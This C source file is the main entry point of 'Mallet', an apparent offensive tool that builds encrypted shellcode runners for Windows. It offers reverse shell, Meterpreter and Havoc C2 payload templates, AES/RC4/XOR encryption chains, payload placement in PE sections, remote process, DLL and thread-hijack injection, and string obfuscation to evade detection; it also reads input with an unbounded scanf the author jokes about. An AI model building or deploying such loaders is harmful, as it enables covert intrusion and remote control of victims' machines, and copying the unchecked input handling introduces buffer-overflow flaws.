#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "util.h"
#include "io.h"

// Splash
void splashScreen()
{
	printf("\n*********************************************************\n");
	printf("  ___  ___        _  _        _           __      _____ \n");
	printf("  |  \\/  |       | || |      | |         /  |    |  _  |\n");
	printf("  | .  . |  __ _ | || |  ___ | |_        `| |    | |/' |\n");
	printf("  | |\\/| | / _` || || | / _ \\| __|        | |    |  /| |\n");
	printf("  | |  | || (_| || || ||  __/| |_        _| |_ _ \\ |_/ /\n");
	printf("  \\_|  |_/ \\__,_||_||_| \\___| \\__|       \\___/(_) \\___/ \n\n");
	printf("**********************************************************\n");

}

int main(int argc, char* argv[])
{

	// Splash screen and user menu
	int c = 0;
	splashScreen();

	// Read in shellcode from file or generate template
	struct PayloadInfo pInfo;
	pInfo.pPayload = NULL;
	pInfo.sPayloadSize = NULL;

	// Shellcode template mode
	if (argc < 2) {
		printf("No shellcode input detected. Select a template: \n");
		printf("1. Reverse shell (msfvenom)\n");
		printf("2. Meterpreter\n");
		printf("3. Havoc C2\n");
		
		printf("Selection: ");
		scanf_s("%d", &c);

		switch (c)
		{
		case 1:
			RevshellPayload(&pInfo.pPayload, &pInfo.sPayloadSize);
			break;
		case 2:
			MeterpreterPayload(&pInfo.pPayload, &pInfo.sPayloadSize);
			break;
		case 3:
			HavocPayload(&pInfo.pPayload, &pInfo.sPayloadSize);
			break;
		}
	}
	// Custom shellcode mode
	else if (argc == 2) {
		printf("Shellcode input file: %s", argv[1]);
		BOOL bRead = ReadShellcode(argv[1], &pInfo.pPayload, &pInfo.sPayloadSize);
	}

	printf("\nSelect a generation mode:\n");
	printf("1. Quick mode\n");
	printf("2. Custom mode\n");
	printf("3. Exit\n");
	do {

		printf("Selection: ");
		scanf_s("%d", &c);

	} while (c < 1 || c > 4);
	if (c == 3) {
		return EXIT_SUCCESS;
	}
	
	// Clearing keychain
	FILE* fKeychain = fopen("keychain.txt", "w");
	fprintf(fKeychain, "");
	fclose(fKeychain);


	// Store user opts in struct
	struct UserOptions sMenuOptions;

	switch (c) {

	case 1: // QUICK MODE

		sMenuOptions.cExecute = 1;
		sMenuOptions.cPlacement = 1;
		sMenuOptions.sCipher = "1";
		sMenuOptions.nRounds = 1;
		printf("\n**********************************************************\n");
		printf("Generating payload with quick mode: AES encryption and .text payload...\n");
		QuickMode(pInfo.pPayload, pInfo.sPayloadSize, sMenuOptions);
		printf("Runner written. Compile MalletRun.sln and execute!");
		break;

	case 2: // CUSTOM MODE

		printf("\n**********************************************************\n");
		// GET ENCRYPTION CHAIN
		char chain[1024];
		printf("\nSpecify custom encryption chain: \n");
		printf("1. AES-256\n");
		printf("2. RC4\n");
		printf("3. XOR\n");
		printf("Selection: ");
		scanf("%s", chain); // Dont bof me :)
		sMenuOptions.sCipher = chain;
		sMenuOptions.nRounds = strlen(sMenuOptions.sCipher);

		// GET PAYLOAD PLACEMENT
		printf("\nSpecify payload location:\n");
		printf("1. .text\n");
		printf("2. .data\n");
		printf("3. .rsrc\n"); // HANDLE THIS WITH WARNING
		printf("Selection: ");
		scanf_s("%ld", &sMenuOptions.cPlacement);

		// GET EXECUTION METHOD (need to handle)
		printf("\nSpecify execution method:\n");
		printf("1. Local thread execution\n");
		printf("2. Remote process injection\n");
		printf("3. Remote DLL injection\n");
		printf("4. Remote thread hijack\n");
		printf("Selection: ");
		scanf_s("%ld", &sMenuOptions.cExecute);

		// OBFUSCATE
		printf("\nWould you like to obfuscate strings?\n");
		printf("1. Yes\n");
		printf("2. No\n");
		printf("Selection: ");
		scanf_s("%ld", &sMenuOptions.cObfuscate);

		// Ideally check here if the user input some BS

		// Generate runner
		CustomMode(pInfo.pPayload, pInfo.sPayloadSize, sMenuOptions);

		break;
	}

		return EXIT_SUCCESS;
}